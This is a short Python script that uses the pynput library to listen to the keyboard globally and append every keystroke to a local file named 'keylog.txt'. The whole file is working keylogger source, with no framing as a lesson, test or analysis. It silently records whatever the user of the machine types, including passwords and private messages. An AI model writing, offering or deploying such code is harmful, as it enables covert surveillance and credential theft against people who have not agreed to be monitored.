from pynput import keyboard

log_file = "keylog.txt"

def on_press(key):
    try:
        key_str = key.char if hasattr(key, 'char') else str(key)
        with open(log_file, "a") as f:
            f.write(key_str + "\n")
    except Exception as e:
        print(f"Error: {e}")

def main():
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    main()
